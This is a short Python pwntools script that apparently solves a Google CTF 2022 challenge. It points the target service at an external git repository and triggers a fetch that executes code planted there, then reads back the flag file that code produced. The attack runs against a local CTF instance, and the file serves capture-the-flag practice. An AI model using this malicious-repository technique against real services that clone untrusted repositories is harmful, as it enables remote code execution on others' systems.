from pwn import *
import time

REPO = 'https://github.com/bitterbit/googlectf-2022-legit.git'
PATH_TO_FLAG_ARTIFACT = 'my-bear-repo/worktree/flag'


def enter_directories(conn, paths):
    select_option(conn, 1)
    for path in paths:
        conn.recvuntil(b'Subdirectory to enter:')
        conn.sendline(str.encode(path))
    conn.sendline(b'')


def trigger_exec(conn):
    select_option(conn, 3) # Check for updates (fetch)
    conn.recvuntil(b'Nothing new..')


def get_file(conn, path):
    select_option(conn, 2) # Print file
    conn.recvuntil(b'Path of the file to display:')
    conn.sendline(str.encode(path))
    return conn.recvline()


def select_exit(conn):
    select_option(conn, 5)


def select_option(conn, option_number: int):
    conn.recvuntil(b'>>>')
    option_string = str(option_number)
    conn.sendline(str.encode(option_string)) # List files in repository


if __name__ == '__main__':
    with context.local(log_level='info'):
        conn = remote('localhost', 1337)
        conn.recvuntil(b'>>> Repo url:')
        conn.sendline(str.encode(REPO))

        enter_directories(conn, ['my-bear-repo'])
        trigger_exec(conn)
        flag = get_file(conn, PATH_TO_FLAG_ARTIFACT)
        print('flag:', flat(flag).strip())

        select_exit(conn)

